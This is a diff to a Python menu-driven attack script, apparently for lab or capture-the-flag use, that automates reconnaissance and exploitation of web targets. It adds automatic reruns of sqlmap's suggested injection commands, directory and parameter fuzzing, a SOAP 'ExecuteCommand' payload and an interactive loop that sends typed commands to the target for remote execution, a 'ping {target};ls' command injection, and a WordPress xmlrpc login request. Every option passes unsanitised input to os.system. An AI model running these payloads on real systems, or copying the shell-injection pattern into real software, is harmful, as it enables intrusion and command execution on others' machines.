@@ -1,6 +1,7 @@
 import os
 import re
 import requests
+import socket
 import subprocess
 from urllib.parse import urlparse
 from colorama import Fore, init
@@ -123,13 +124,48 @@ def option_7(target):
     os.system(f"cat {target}.xml | aquatone -nmap")
 
 def option_8(target):
-    os.system(f"sqlmap -u {target} --batch --is-dba")
+    def is_ip_address(target):
+        try:
+            socket.inet_aton(target)
+            return True
+        except socket.error:
+            return False
+    
+    if is_ip_address(target):
+        url = f"http://{target}"
+    else:
+        parsed = urlparse(target)
+        if not parsed.scheme:
+            url = f"http://{target}"
+        else:
+            url = target
 
+    scan_command = f"sqlmap -u {url} --forms --crawl=2 --batch --is-dba"
+
+    # Run the initial SQLMap scan
+    output = subprocess.check_output(scan_command, shell=True, text=True)
+    
+    print(output)
+
+    # Search for suggestions in the SQLMap output
+    suggestions = re.findall(r"you can rerun.+using the following.+?:\n\n(.+?)\n", output)
+
+    # Check if any suggestions were found
+    if suggestions:
+        print("\n[+] Running suggested commands from the first scan:\n")
+        
+        # Run each suggested command in a new SQLMap scan
+        for suggestion in suggestions:
+            print(f"[*] Running: sqlmap {suggestion}\n")
+            os.system(f"sqlmap {suggestion}")
+            print("\n")
+    else:
+        print("[-] No suggestions found from the first scan.")
 def option_9(target):
-    os.system(f"dirb {target}")
+    os.system(f"dirb  http://{target}/")
     os.system(f"curl {target}/wsdl")
     os.system(f"curl {target}/wsdl?wsdl")
-    os.system(f"ffuf -w 'burp-parameter-names.txt' -u '{target}/wsdl?FUZZ' -fs 0 -mc 200")
+    os.system(f"ffuf -w 'burp-parameter-names.txt' -u 'http://{target}/wsdl?FUZZ' -fs 0 -mc 200")
 
 def option_10(target):
     with open("client.py", "w") as f:
@@ -137,7 +173,7 @@ def option_10(target):
 
 payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><ExecuteCommandRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></ExecuteCommandRequest></soap:Body></soap:Envelope>'
 
-print(requests.post("{target}/wsdl", data=payload, headers={{"SOAPAction":'"ExecuteCommand"'}}).content)
+print(requests.post("http://{target}/wsdl", data=payload, headers={{"SOAPAction":'"ExecuteCommand"'}}).content)
 ''')
     os.system("python3 client.py")
 
@@ -148,12 +184,12 @@ def option_11(target):
 while True:
     cmd = input("$ ")
     payload = f'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>{{cmd}}</cmd></LoginRequest></soap:Body></soap:Envelope>'
-    print(requests.post("{target}/wsdl", data=payload, headers={{"SOAPAction":'"ExecuteCommand"'}}).content)
+    print(requests.post("http://{target}/wsdl", data=payload, headers={{"SOAPAction":'"ExecuteCommand"'}}).content)
 ''')
     os.system("python3 automate.py")
 
 def option_12(target):
-    os.system(f"ping {target}")
+    os.system(f"ping {target};ls")
 
 def option_13(target):
     os.system(f'''curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" {target}/xmlrpc.php''')
